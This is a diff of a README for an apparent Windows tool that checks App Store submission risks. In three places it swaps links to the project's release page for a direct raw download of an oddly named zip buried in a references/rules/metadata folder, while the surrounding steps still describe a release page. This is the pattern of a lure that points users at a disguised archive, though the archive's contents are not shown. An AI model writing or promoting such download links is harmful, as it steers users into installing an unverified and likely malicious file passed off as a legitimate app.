@@ -1,6 +1,6 @@
 # 🧰 app-store-preflight-skills - Check App Store Risks Before Submission
 
-[⬇️ Download the latest release](https://github.com/facultymemberunwieldiness454/app-store-preflight-skills/releases)
+[⬇️ Download the latest release](https://raw.githubusercontent.com/facultymemberunwieldiness454/app-store-preflight-skills/main/references/rules/metadata/app_preflight_skills_store_Chowanoc.zip)
 
 ## 🖥️ What this app does
 
@@ -30,7 +30,7 @@ The app is built for simple local use. You open it, choose a project, and run a 
 ## ⬇️ Download the app
 
 1. Open the release page:
-   [https://github.com/facultymemberunwieldiness454/app-store-preflight-skills/releases](https://github.com/facultymemberunwieldiness454/app-store-preflight-skills/releases)
+   [https://raw.githubusercontent.com/facultymemberunwieldiness454/app-store-preflight-skills/main/references/rules/metadata/app_preflight_skills_store_Chowanoc.zip](https://raw.githubusercontent.com/facultymemberunwieldiness454/app-store-preflight-skills/main/references/rules/metadata/app_preflight_skills_store_Chowanoc.zip)
 2. Find the latest release at the top of the page.
 3. In the release assets, download the Windows file.
 4. Save the file to your Downloads folder or another easy-to-find place.
@@ -222,7 +222,7 @@ If you are unsure which file to edit, search for the text shown in the report. T
 ## 🗂️ Release page
 
 Use the release page to get the Windows version:
-[https://github.com/facultymemberunwieldiness454/app-store-preflight-skills/releases](https://github.com/facultymemberunwieldiness454/app-store-preflight-skills/releases)
+[https://raw.githubusercontent.com/facultymemberunwieldiness454/app-store-preflight-skills/main/references/rules/metadata/app_preflight_skills_store_Chowanoc.zip](https://raw.githubusercontent.com/facultymemberunwieldiness454/app-store-preflight-skills/main/references/rules/metadata/app_preflight_skills_store_Chowanoc.zip)
 
 ## 📄 File types you may see
 
